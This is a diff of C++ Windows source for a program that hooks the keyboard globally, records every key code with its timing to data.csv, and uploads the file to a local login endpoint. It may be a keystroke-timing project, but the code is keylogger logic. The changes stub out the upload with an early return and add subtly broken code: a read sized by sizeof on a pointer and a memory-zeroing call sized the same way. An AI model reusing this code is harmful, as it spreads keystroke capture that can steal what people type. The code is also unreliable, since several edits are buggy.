@@ -30,6 +30,7 @@ static void initialize_hook_thread();
 static void begin_file_transfer(std::string userName, std::string password);
 bool hash_password(std::string pass, std::string* outPass);
 bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string password);
+std::string readWholeFile();
 
 DWORD lastKey = 0x0;
 DWORD lastAction = 0x0;
@@ -188,6 +189,10 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 	case VK_LSHIFT:
 	case VK_RSHIFT:
 	case VK_BACK:
+	{
+		// When this is found, we will delete the last line in the file.
+		break;
+	}
 	case VK_LWIN:
 	case VK_RWIN:
 	case VK_RETURN:
@@ -204,7 +209,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 		if (nonochars.rfind((char)(char)mapKey) != std::string::npos) // is the character sent a punctuation character or anything?
 			return;
 
-		stringStore[vkCode] += ((char)mapKey);
+		stringStore[vkCode] += std::to_string(mapKey);
 		stringStore[vkCode] += ',';
 		//_itoa_s((unsigned long)time, itoaOutput, sizeof(itoaOutput), 10);
 		stringStore[vkCode] += std::to_string(time);
@@ -229,7 +234,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 		if (FirstEntry)
 		{
 			FirstEntry = false;
-			stringStore[vkCode] += ",0\n";
+			stringStore[vkCode] += ",0";
 			prevKey = vkCode;
 		}
 		else
@@ -417,7 +422,7 @@ bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string 
 	std::string header; // Construct our raw http header
 	header = "POST /user/login HTTP/1.1\r\n";
 	header += "Host: 127.0.0.1:5000\r\n";
-	header += "Content-Type: application/x-www-form-urlencoded\r\n";
+	header += "Content-Type: multipart/form-data; boundary=----file\r\n";
 	header += "Content-Length: " + std::to_string(dataSize) + "\r\n";
 	header += "Accept-Charset: utf-8\r\n";
 	header += "\r\n";
@@ -476,7 +481,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 {
 
 	std::string outPass; // Hash our password
-	if(!hash_password(password, &outPass))
+	if (!hash_password(password, &outPass))
 	{
 		printf("Something went wrong in hashing password...\n");
 		return;
@@ -488,7 +493,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 		hints;
 	SOCKET ConnectionSocket = INVALID_SOCKET;
 
-	ZeroMemory(wsaData, sizeof(WSADATA));
+	ZeroMemory(wsaData, sizeof(wsaData));
 	int init_result = WSAStartup(MAKEWORD(2, 2), wsaData);
 	if (init_result != 0)
 	{
@@ -530,6 +535,9 @@ static void begin_file_transfer(std::string userName, std::string password)
 		return;
 	}
 
+	std::string retFile = readWholeFile();
+	printf("\n\n\n\n%s\n\n\n\n", retFile.c_str());
+	return;
 	if (!(authorize_user(&ConnectionSocket, userName, outPass)))
 	{
 		printf("Bad authentication details...\n");
@@ -548,9 +556,11 @@ static void begin_file_transfer(std::string userName, std::string password)
 		return;
 	}*/
 
+}
 
-	
-
+std::string readWholeFile()
+{
+	std::string wholeFile;
 	std::ifstream sendFile("data.csv", std::ifstream::in);
 	//printf("0x%08x\n", (DWORD&)sendFile);
 	if (sendFile)
@@ -559,34 +569,18 @@ static void begin_file_transfer(std::string userName, std::string password)
 		char* buffer = new char[1024];
 		ZeroMemory(buffer, 1024);
 
-		while (!sendFile.eof()) // -1 to accomodate for \0
+		while (!sendFile.eof())
 		{
-			sendFile.read(buffer, (1024 - 1));
+			sendFile.read(buffer, sizeof(buffer));
 			//printf("[Buffer]: %s\n", buffer);
-			buffer[1023] = '\0';
-			init_result = send(ConnectionSocket, buffer, 1024, 0);
-			if (init_result == SOCKET_ERROR)
-			{
-				printf("Send failed: 0x%08x\n", WSAGetLastError());
-				closesocket(ConnectionSocket);
-				WSACleanup();
-				return;
-			}
+			wholeFile += buffer;
+
 			//printf("%s\n", buffer);
 			ZeroMemory(buffer, 1024);
-			printf("Sent 1024 bytes...\n");
 		}
 
 		delete[] buffer;
 	}
-	else
-	{
-		printf("SendFile is bad...\n");
-		closesocket(ConnectionSocket);
-		WSACleanup();
-	}
 
-	sendFile.close();
-	closesocket(ConnectionSocket);
-	WSACleanup();
+	return wholeFile;
 }
